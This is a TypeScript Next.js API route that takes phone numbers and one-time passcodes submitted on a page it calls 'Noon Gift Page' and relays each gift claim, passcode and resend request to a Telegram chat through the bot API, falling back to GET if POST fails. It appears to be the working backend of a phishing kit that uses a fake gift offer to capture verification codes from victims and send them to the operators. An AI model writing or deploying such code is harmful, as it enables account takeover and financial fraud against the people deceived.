// app/api/notify/route.ts
import { NextRequest, NextResponse } from "next/server";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";
export const maxDuration = 15;

export async function POST(req: NextRequest) {
  try {
    const { kind, phone, otp } = await req.json();

    if (!phone) {
      return NextResponse.json({ error: "Phone number required" }, { status: 400 });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram credentials missing");
      return NextResponse.json({ error: "Server config error" }, { status: 500 });
    }

    // Keep timestamp formatting runtime-safe across Node/Edge variants.
    const now = (() => {
      try {
        return new Intl.DateTimeFormat("en-US", {
          timeZone: "Asia/Riyadh",
          year: "numeric",
          month: "short",
          day: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          hour12: true,
        }).format(new Date());
      } catch {
        return new Date().toISOString();
      }
    })();

    let message = "";

    if (kind === "otp_submission") {
      if (!otp) {
        return NextResponse.json({ error: "OTP required" }, { status: 400 });
      }
      message =
        `OTP Received From User\n\n` +
        `Phone: ${phone}\n` +
        `OTP: ${otp}\n` +
        `Time: ${now}\n` +
        `Platform: Noon Gift Page`;
    } else if (kind === "otp_resend_request") {
      message =
        `OTP Resend Requested\n\n` +
        `Phone: ${phone}\n` +
        `Time: ${now}\n` +
        `Platform: Noon Gift Page`;
    } else {
      message =
        `New Gift Claim Attempt\n\n` +
        `Phone: ${phone}\n` +
        `Time: ${now}\n` +
        `Platform: Noon Gift Page`;
    }

    let telegramRes: Response | null = null;
    let telegramBody = "";
    let transportError = "";

    // Try POST first.
    try {
      telegramRes = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
          signal: AbortSignal.timeout(10000),
        }
      );
      telegramBody = await telegramRes.text();
    } catch (err) {
      transportError =
        err instanceof Error
          ? `${err.message}${err.cause ? ` | cause: ${String(err.cause)}` : ""}`
          : "Unknown transport error";
    }

    // Fallback to GET if POST transport failed or Telegram returned non-OK.
    if (!telegramRes || !telegramRes.ok) {
      try {
        const query = new URLSearchParams({
          chat_id: String(chatId),
          text: message,
        });
        const fallbackRes = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage?${query.toString()}`,
          { method: "GET", signal: AbortSignal.timeout(10000) }
        );
        const fallbackBody = await fallbackRes.text();

        if (!fallbackRes.ok) {
          const details = transportError
            ? `POST transport failed: ${transportError} | GET fallback failed: ${fallbackBody}`
            : fallbackBody;
          console.error("Telegram error:", details);
          return NextResponse.json(
            { error: "Telegram send failed", details },
            { status: 500 }
          );
        }

        return NextResponse.json({
          success: true,
          details: "Sent via GET fallback",
        });
      } catch (fallbackErr) {
        const fallbackDetails =
          fallbackErr instanceof Error
            ? `${fallbackErr.message}${
                fallbackErr.cause ? ` | cause: ${String(fallbackErr.cause)}` : ""
              }`
            : "Unknown GET fallback error";
        const details = transportError
          ? `POST transport failed: ${transportError} | GET fallback error: ${fallbackDetails}`
          : fallbackDetails;
        console.error("Telegram transport error:", details);
        return NextResponse.json(
          { error: "Telegram transport failure", details },
          { status: 500 }
        );
      }
    }

    return NextResponse.json({ success: true, details: telegramBody });
  } catch (error) {
    console.error("Notify route error:", error);
    const details =
      error instanceof Error
        ? `${error.message}${error.cause ? ` | cause: ${String(error.cause)}` : ""}`
        : "Unknown server exception";
    return NextResponse.json(
      { error: "Internal server error", details },
      { status: 500 }
    );
  }
}
